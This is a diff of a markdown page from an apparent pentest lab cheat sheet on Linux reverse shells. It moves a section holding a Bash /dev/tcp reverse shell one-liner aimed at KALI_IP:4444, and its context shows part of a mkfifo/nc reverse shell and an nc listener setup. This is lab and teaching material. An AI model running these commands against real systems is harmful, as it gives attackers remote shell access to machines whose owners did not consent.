@@ -21,18 +21,6 @@ Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=linux-reverse-shell) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Connect a Bash command session to a listener
-
-**Run in:** Linux target shell. **Requires:** Bash with TCP redirection support and a reachable Kali nc -lvnp 4444 listener; replace the callback address with one reachable from this target.
-
-```bash
-bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
-```
-
-**What the result establishes:** Verify which shell is executing the payload and which network address is reachable from the target.
-
-**Next check:** Check Bash availability, shell quoting, egress and listener binding independently; after connection verify id and the hostname before upgrading the terminal.
-
 ## 1. Kali — listener
 
 **Kali**
@@ -51,6 +39,18 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc LHOST 7777 > /t
 
 Replace LHOST; the saved recipe uses /tmp/f.
 
+## Connect a Bash command session to a listener
+
+**Run in:** Linux target shell. **Requires:** Bash with TCP redirection support and a reachable Kali nc -lvnp 4444 listener; replace the callback address with one reachable from this target.
+
+```bash
+bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
+```
+
+**What the result establishes:** Verify which shell is executing the payload and which network address is reachable from the target.
+
+**Next check:** Check Bash availability, shell quoting, egress and listener binding independently; after connection verify id and the hostname before upgrading the terminal.
+
 ## If it fails
 
 | Symptom | Check |
@@ -62,6 +62,8 @@ Replace LHOST; the saved recipe uses /tmp/f.
 - [Official documentation 1](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
